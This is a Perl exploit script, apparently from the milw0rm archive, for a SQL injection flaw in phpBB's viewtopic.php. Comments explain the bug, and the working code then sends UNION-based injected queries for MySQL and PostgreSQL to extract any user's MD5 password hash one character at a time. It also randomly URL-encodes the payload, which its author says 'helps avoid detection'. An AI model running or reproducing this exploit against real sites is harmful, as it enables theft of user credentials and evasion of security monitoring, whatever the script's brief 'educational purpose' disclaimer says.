@@ -1,0 +1,136 @@
+#!/usr/bin/perl -w
+#
+#
+# phpBB password disclosure vuln.
+# - rick patel
+# 
+# There is a sql injection vuln which exists in /viewtopic.php file. The variable is $topic_id
+# which gets passed directly to sql server in query. Attacker could pass a special sql string which
+# can used to see md5 password hash for any user (!) for phpBB. This pass can be later used with
+# autologin or cracked using john. 
+#
+# Details: 
+#
+# this is checking done for $topic_id in viewtopic.php:
+#
+# if ( isset($HTTP_GET_VARS[POST_TOPIC_URL]) )
+# {
+# $topic_id = intval($HTTP_GET_VARS[POST_TOPIC_URL]);
+# }
+# else if ( isset($HTTP_GET_VARS['topic']) )
+# {
+# $topic_id = intval($HTTP_GET_VARS['topic']);
+# }
+#
+# ok... no else statement at end :)
+# now if GET[view]=newest and GET[sid] is set, this query gets executed:
+#
+# $sql = "SELECT p.post_id
+# FROM " . POSTS_TABLE . " p, " . SESSIONS_TABLE . " s, " . USERS_TABLE . " u
+# WHERE s.session_id = '$session_id'
+# AND u.user_id = s.session_user_id
+# AND p.topic_id = $topic_id
+# AND p.post_time >= u.user_lastvisit
+# ORDER BY p.post_time ASC
+# LIMIT 1";
+#
+# $topic_id gets passed directy to query. So how can we use this to do something important? Well
+# I decided to use union and create a second query will get us something useful. There were couple of 
+# problems i ran into. first, phpBB only cares about the first row returned. second, the select for first
+# query is p.post_id which is int, so int becomes the type returned for any other query in union. third,
+# there is rest of junk at end " AND p.post_time >= ..." We tell mysql to ignore that by placing /* at end
+# of our injected query. So what query can we make that returns only int? 
+# this one => select ord(substring(user_password,$index,1)) from phpbb_users where user_id = $uid
+# Then all we have to do is query 32 times which $index from 1-32 and we get ord value of all chars of
+# md5 hash password. 
+#
+# I have only tested this with mysql 4 and pgsql . Mysql 3.x does not support unions so you would have to tweak
+# the query to do anything useful. 
+# 
+# This script is for educational purpose only. Please dont use it to do anything else. 
+#
+# To Fix this bug : http://www.phpbb.com/phpBB/viewtopic.php?t=112052
+
+use IO::Socket;
+
+$remote = shift || 'localhost';
+$view_topic = shift || '/phpBB2/viewtopic.php';
+$uid = shift || 2;
+$port = 80;
+
+$dbtype = 'mysql4'; # mysql4 or pgsql 
+
+
+print "Trying to get password hash for uid $uid server $remote dbtype: $dbtype\n";
+
+$p = "";
+
+for($index=1; $index<=32; $index++)
+{
+$socket = IO::Socket::INET->new(PeerAddr => $remote,
+PeerPort => $port,
+Proto => "tcp",
+Type => SOCK_STREAM)
+or die "Couldnt connect to $remote:$port : $@\n";
+$str = "GET $view_topic" . "?sid=1&topic_id=-1" . random_encode(make_dbsql()) .
+ "&view=newest" . " HTTP/1.0\n\n";
+
+print $socket $str;
+print $socket "Cookie: phpBB2mysql_sid=1\n"; # replace this for pgsql or remove it
+print $socket "Host: $remote\n\n";
+
+while ($answer = <$socket>)
+{
+if ($answer =~ /Location:.*\x23(\d+)/) # Matches the Location: viewtopic.php?p=<num>#<num>
+{
+$p .= chr ($1);
+}
+}
+
+close($socket);
+}
+
+print "\nMD5 Hash for uid $uid is $p\n";
+
+# random encode str. helps avoid detection
+sub random_encode
+{
+$str = shift;
+$ret = "";
+for($i=0; $i<length($str); $i++)
+{
+$c = substr($str,$i,1);
+$j = rand length($str) * 1000;
+
+if (int($j) % 2 || $c eq ' ')
+{
+$ret .= "%" . sprintf("%x",ord($c));
+}
+else
+{
+$ret .= $c;
+}
+}
+return $ret;
+}
+
+sub make_dbsql
+{
+if ($dbtype eq 'mysql4')
+{
+return " union select ord(substring(user_password," . $index . ",1)) from phpbb_users where user_id=$uid/*" ;
+} elsif ($dbtype eq 'pgsql')
+{
+return "; 
+select ascii(substring(user_password from $index for 1)) as 
+post_id from phpbb_posts p, phpbb_users u where u.user_id=$uid or false";
+}
+else 
+{
+return "";
+}
+}
+
+
+
+# milw0rm.com [2003-06-20]
